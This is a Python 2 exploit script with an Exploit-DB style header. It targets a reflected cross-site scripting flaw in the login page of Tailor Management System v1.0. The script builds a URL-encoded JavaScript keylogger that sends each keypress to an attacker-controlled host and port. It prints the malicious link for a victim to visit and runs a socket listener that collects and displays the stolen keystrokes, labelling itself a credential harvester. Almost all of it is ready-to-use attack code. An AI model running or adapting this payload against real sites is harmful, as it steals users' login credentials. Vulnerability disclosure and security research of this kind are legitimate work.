# Exploit Title: Tailor MS v1.0 - Reflected XSS Key Logger
# Exploit Author: Bobby Cooke (boku)
# Date: August 9th, 2020
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/sites/default/files/download/Warren%20Daloyan/tailor.zip
# Version: 1.0
# Tested On: Windows 10 Pro + XAMPP | Python 2.7
# OWASP Top Ten 2017: A7:2017-Cross-Site Scripting (XSS)
# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') - Type 1: Reflected XSS
# CWE-523: Unprotected Transport of Credentials
# CVSS Base Score: 6.4 # Impact Subscore: 4.7 # Exploitability Subscore: 1.6
# CVSS v3.1 Vector: AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L
# Vulnerability Description:
# Reflected Cross-Site Scripting (XSS) vulnerability in 'index.php' login-portal webpage of SourceCodesters Tailor Management System v1.0 allows remote attackers to harvest keys pressed via unauthenticated victim clicking malicious URL and typing.
import socket,sys,urllib,re
from thread import *
from colorama import Fore, Style


F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
ok   = S[3]+F[2]+')'+F[5]+'+++'+F[2]+'['+F[8]+'========> '+S[0]+F[0]
err  = S[3]+F[2]+'<========'+F[2]+'('+F[5]+'+++'+F[2]+'( '+F[0]+S[0]
R, C, G = Fore.RED, Fore.CYAN, Fore.GREEN

def urlEncode(javascript):
    return urllib.quote(javascript)

def genXssPayload(LHOST,LPORT):
    XSS_PAYLOAD  = '<script>'
    XSS_PAYLOAD += 'var xhr = new XMLHttpRequest();'
    XSS_PAYLOAD += 'document.onkeypress = function keyLogger(key) {'
    XSS_PAYLOAD += 'key_press = String.fromCharCode(key.which);'
    XSS_PAYLOAD += 'var uri = "http://'+LHOST+':'+LPORT+'?KEY="+key_press;'
    XSS_PAYLOAD += 'xhr.open("GET", uri, true);'
    XSS_PAYLOAD += 'xhr.send();}'
    XSS_PAYLOAD += '</script>'
    return XSS_PAYLOAD

def clientthread(conn):
    try:
        while True:
            data = conn.recv(1024)
            key = re.findall(r'KEY\=\w',data)
            key = re.sub('KEY\=','',key[0])
            print(printKey(key))
            if not data:
                break
    except:
        conn.close()

def banner():
    BANNER  = S[3]+C+' _______ _______ _______     _______ _______ _______     _______ _______ _______ _______ _______ _______ \n'
    BANNER += C+'|\     /|\     /|\     /|   |\     /|\     /|\     /|   |\     /|\     /|\     /|\     /|\     /|\     /|\n'
    BANNER += C+'| +---+ | +---+ | +---+ |   | +---+ | +---+ | +---+ |   | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |\n'
    BANNER += C+'| |   | | |   | | |   | |   | |   | | |   | | |   | |   | |   | | |   | | |   | | |   | | |   | | |   | |\n'
    BANNER += C+'| | '+R+'X'+C+' | | | '+R+'$'+C+' | | | '+R+'$'+C+' | |   | | '+R+'K'+C+' | | | '+R+'3'+C+' | | | '+R+'Y'+C+' | |   | | '+R+'L'+C+' | | | '+R+'0'+C+' | | | '+R+'G'+C+' | | | '+R+'G'+C+' | | | '+R+'3'+C+' | | | '+R+'R'+C+' | |\n'
    BANNER += C+'| +---+ | +---+ | +---+ |   | +---+ | +---+ | +---+ |   | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |\n'
    BANNER += C+'|/_____\|/_____\|/_____\|   |/_____\|/_____\|/_____\|   |/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|\n\r\n'
    BANNER += '                                          '+R+'BOKU '+F[0]+'&'+C+' HYD3SEC'+F[0]+S[0]+'\r\n'
    return BANNER

def printKey(key):
    keyGen  = S[3]+C+'     _______\n' 
    keyGen += C+'    |\     /|\n'
    keyGen += C+'    | +---+ |\n'
    keyGen += C+'    | |   | |\n'
    keyGen += C+'    | | '+R+key+C+' | |\n'
    keyGen += C+'    | +---+ |\n'
    keyGen += C+'    |/_____\|'+F[0]+S[0]
    return keyGen         

def header():
    head = S[1]+F[2]+'                         __---* '+F[7]+'Tailor MS v1.0 '+F[2]+'| '+F[7]+'Reflected XSS Key Logger '+F[2]+'*---__\n'+S[0]
    return head

def formatHelp(STRING):
    return S[3]+F[2]+STRING+S[0]

if __name__ == "__main__":
    print(header())
    print(banner())
    if len(sys.argv) != 4:
        print(ok+formatHelp(" Usage:   python %s <WEBAPP_URL> <LHOST> <LPORT>" % sys.argv[0]))
        print(ok+formatHelp(" Example: python %s 'http://172.16.65.134/tailor/' '172.16.65.1' 80\r\n" % sys.argv[0]))
        print(err+"Try Again..\r\n")
        sys.exit(-1)
    WEBAPP_URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    if not re.match(r".*/$", WEBAPP_URL):
        WEBAPP_URL = WEBAPP_URL+'/'
    WEBAPP_URL = WEBAPP_URL+'index.php'
    PAYLOAD = genXssPayload(LHOST,LPORT)
    ENCODED_PAYLOAD = urlEncode(PAYLOAD)
    print(ok+F[0]+'To '+S[3]+F[2]+'Harvest Keys'+F[0]+S[0]+', have a'+F[3]+' User '+F[0]+'visit '+F[5]+'this URL'+F[0]+' and '+F[7]+'Login'+F[0]+':\r\n')
    print(S[3]+F[5]+WEBAPP_URL+'?error=ALL%20YOUR%20K3Y$%20ARE%20BELONG%20TO%20US.%20'+ENCODED_PAYLOAD+S[0]+'\r\n')
    LPORT = int(LPORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LHOST,LPORT))
    print(ok+S[1]+G+"Binding to Socket."+F[0]+S[0])
    s.listen(100)
    print(ok+S[1]+G+"Listening on Socket for incoming connections."+F[0]+S[0])
    try:
        while 1:
            conn, addr = s.accept()
            start_new_thread(clientthread ,(conn,))
    except:
        s.close()
        print('\r\n'+err+"Exiting Keylogger Credential Harvester..")

